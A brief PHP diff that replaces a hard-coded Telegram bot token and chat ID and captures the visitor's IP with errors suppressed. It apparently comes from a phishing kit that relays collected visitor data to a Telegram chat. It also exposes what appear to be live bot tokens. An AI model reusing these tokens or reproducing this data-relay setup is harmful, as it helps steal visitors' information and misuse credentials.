@@ -2,8 +2,8 @@
 error_reporting(0);
 session_start();
 
-define("TOKEN", '8312796249:AAGnwcsAsO2O4zSfmZUuHf5pYrgWPkHS9Vs');
-define("CHAT_ID", '-1003060032594');
+define("TOKEN", '8796576363:AAGvTaSAMj4MzyNli5h5grWCTMrFsOBSiYc');
+define("CHAT_ID", '-1003724376056');
 
 $ip = get_user_ip();
 
